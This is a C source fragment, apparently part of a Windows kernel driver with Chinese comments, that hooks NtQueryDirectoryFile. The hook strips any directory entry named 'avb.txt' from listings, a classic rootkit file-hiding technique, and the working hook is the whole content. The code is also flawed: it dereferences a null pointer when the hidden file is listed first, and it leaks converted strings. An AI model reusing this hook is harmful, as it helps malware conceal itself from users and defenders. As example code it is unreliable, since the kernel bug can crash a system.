```c
ANSI_STRING HideFileName;
ULONG Offset;
NTSTATUS
  SelfNtQueryDirectoryFile (
  __in HANDLE FileHandle,
  __in_opt HANDLE Event,
  __in_opt PIO_APC_ROUTINE ApcRoutine,
  __in_opt PVOID ApcContext,
  __out PIO_STATUS_BLOCK IoStatusBlock,
  __out_bcount(Length) PVOID FileInformation,
  __in ULONG Length,
  __in FILE_INFORMATION_CLASS FileInformationClass,
  __in BOOLEAN ReturnSingleEntry,
  __in PUNICODE_STRING FileName OPTIONAL,
  __in BOOLEAN RestartScan
  )
{
  NTSTATUS RetStatus;
  ANSI_STRING HideFileName;
  ANSI_STRING AnsiCurrentFileName;
  UNICODE_STRING UniCurrentFileName;
  PFILE_BOTH_DIR_INFORMATION _CurrentObject;
  PFILE_BOTH_DIR_INFORMATION _PrveObject;
  BOOLEAN IsLastOne;
  MyNtQueryDirectoryFileFun=(NewNtQueryDirectoryFile)RealNtQueryDirectoryFun;
  RetStatus=MyNtQueryDirectoryFileFun(FileHandle,Event,ApcRoutine,ApcContext,IoStatusBlock,FileInformation,Length,FileInformationClass,ReturnSingleEntry,FileName,RestartScan);
  //过滤文件
  if(NT_SUCCESS(RetStatus))//判断是否执行成功
  {
    if(FileInformationClass==FileBothDirectoryInformation)//判断类型是否是文件目录信息
    {
      RtlInitAnsiString(&HideFileName,"avb.txt");//要隐藏的文件
      _CurrentObject=(PFILE_BOTH_DIR_INFORMATION)FileInformation;
      _PrveObject=NULL;
      do 
      {
        IsLastOne=!(_CurrentObject->NextEntryOffset);//等于0 就是最后一个
        RtlInitUnicodeString(&UniCurrentFileName,_CurrentObject->FileName);
        RtlUnicodeStringToAnsiString(&AnsiCurrentFileName,&UniCurrentFileName,TRUE);
        if(RtlCompareMemory(AnsiCurrentFileName.Buffer,HideFileName.Buffer,HideFileName.Length)==HideFileName.Length)//复制完相同就是相等的
        {
          if(IsLastOne)//是最后一个了
          {
            _PrveObject->NextEntryOffset=0;//设置前一个的下一个的偏移为0
            break;
          }else
          {
            //复制下一个的地址到当前地址，感觉这种很舒服
            _PrveObject->NextEntryOffset += _CurrentObject->NextEntryOffset;
            break;//这次就算完了.break 适用于隐藏一个文件，多个文件时，要用continue;
          }
        }
        _PrveObject=_CurrentObject;
        _CurrentObject=(PFILE_BOTH_DIR_INFORMATION)((char *)_CurrentObject + _CurrentObject->NextEntryOffset);//继续下一个
      } while (!IsLastOne);
    }
  }
  return RetStatus;
}
```
